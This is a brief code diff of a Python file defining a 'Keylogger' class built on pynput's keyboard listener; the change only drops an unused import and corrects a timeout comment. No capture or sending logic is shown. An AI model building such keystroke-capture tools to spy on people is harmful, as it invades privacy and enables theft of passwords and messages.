@@ -3,9 +3,8 @@ import threading
 from pynput import keyboard
 from io import StringIO
 import time
-import sys
 
-TIMEOUT = 60  # 10 minutes
+TIMEOUT = 60  # 1 minute
 
 class Keylogger:
     def __init__(self):
